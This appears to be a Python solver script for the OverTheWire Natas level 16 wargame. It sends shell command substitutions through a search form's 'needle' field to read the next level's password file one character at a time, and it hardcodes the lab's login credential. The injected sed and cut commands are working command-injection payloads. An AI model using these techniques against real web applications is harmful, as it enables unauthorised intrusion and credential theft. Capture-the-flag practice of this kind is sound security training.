from pathlib import Path
import requests
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup as bs

def gensed(pos, lng):
    pos = pos - 1
    return rf'$(sed -e s/[a-z]/_/g -e s/^{"."*pos}// -e s/{"."*(lng-pos-1)}\$// /etc/natas_webpass/natas17)'

cs = Path('singles.txt').read_text().split()

print(cs)

with requests.Session() as s:
    auth = HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V')
    url = 'http://natas16.natas.labs.overthewire.org'
    
    for i in range(1, 32+1):
        if cs[i-1] == 'NUM': continue

        bash = rf'$(cut -c {i} /etc/natas_webpass/natas17)'

        r = s.post(url, auth=auth, data={'needle': gensed(i, 32)})

        # print(bs(r.content).prettify())

        l = list(
            bs(r.content).find('div', id='content').find('pre').next.splitlines()
        )

        print(len(l))

        if len(l) == 1: cs[i-1] = cs[i-1].upper()

        print(f'{i}: {cs[i-1]}')

print(cs)
